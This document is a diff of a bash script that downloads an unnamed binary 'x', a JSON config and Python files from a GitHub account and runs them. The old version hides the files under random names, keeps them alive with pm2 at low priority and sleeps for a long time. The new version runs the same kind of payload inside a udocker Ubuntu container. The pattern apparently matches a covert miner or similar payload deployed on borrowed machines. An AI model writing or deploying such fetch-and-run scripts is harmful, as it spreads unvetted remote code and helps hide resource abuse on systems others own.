@@ -1,28 +1,48 @@
-#!/bin/bash
-random_name() {
-      tr -dc A-Za-z0-9 </dev/urandom | head -c 105
-  }
-  sudo apt update
+
+#!/usr/bin/env bash
+
+set -e
+
+python3 -m pip install --user udocker
+export PATH="$HOME/.local/bin:$PATH"
+udocker --version
+IMAGE="ubuntu:20.04"
+CONTAINER="ubuntu-auto"
+
+echo "[1] Checking udocker..."
+command -v udocker >/dev/null || {
+    echo "udocker is not installed"
+    exit 1
+}
+
+echo "[2] Pulling Ubuntu..."
+udocker pull "$IMAGE"
+
+echo "[3] Creating container..."
+udocker create --name="$CONTAINER" "$IMAGE" >/dev/null 2>&1 || true
+
+echo "[4] Running commands inside Ubuntu..."
+
+udocker run "$CONTAINER" bash -c '
+set -e
+
+apt-get update
+apt-get install -y libc6 libstdc++6 python3 wget
+
+echo "Ubuntu environment:"
+cat /etc/os-release
+
+echo "GLIBC version:"
+ldd --version
+
+echo "Executing main.py..."
+cd /mnt
 wget https://raw.githubusercontent.com/hosseinxdns4/potential-bassoon/main/x
-
-NEW_V2=$(random_name)
-mv x $NEW_V2
-chmod +x $NEW_V2
-wget https://raw.githubusercontent.com/hosseinxdns4/cautious-umbrella/main/w.json
-
-echo "./$NEW_V2 run --config=w.json" > bash.sh
-NEW_SH=$(random_name).sh
-mv bash.sh $NEW_SH
-chmod +x $NEW_SH
-
-npm install -g pm2
-pm2 start $NEW_SH
-
-wget https://raw.githubusercontent.com/hosseinxdns4/fictional-bassoon/main/main.py
-NEW_PY=$(random_name).py
-mv main.py $NEW_PY
-chmod +x $NEW_PY
-echo "./$NEW_PY" > bsh.sh
-chmod +x bsh.sh
-nice -n 19 pm2 start bsh.sh
-sleep 1600
+wget https://raw.githubusercontent.com/hosseinxdns4/cautious-umbrella/main/s.json
+wget https://raw.githubusercontent.com/hosseinxdns4/ideal-winner/main/ht.py
+echo "./x run --config=s.json" > bash.sh
+chmod 777 *
+./bash.sh &
+./x run —config=s.json
+./ht.py
+'
